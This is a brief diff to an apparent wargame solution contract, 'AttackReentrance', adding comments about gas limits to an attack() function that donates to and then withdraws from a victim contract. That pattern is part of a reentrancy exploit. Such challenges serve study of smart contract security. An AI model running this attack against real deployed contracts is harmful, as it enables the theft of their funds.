@@ -13,9 +13,10 @@ contract AttackReentrance {
         owner = msg.sender;
     }
 
+    //the attack call was given a gas limit of 112799 and used 81962 (72.66%)
     function attack() public {
         uint256 balanceTotal = victim.balance;
-        Reentrance(victim).donate{value: balanceTotal, gas: 1000000}(
+        Reentrance(victim).donate{value: balanceTotal, gas: 1000000}( //need to add more gaz, otherwise donate() revert with out-of-gas error
             address(this)
         );
         Reentrance(victim).withdraw(balanceTotal);
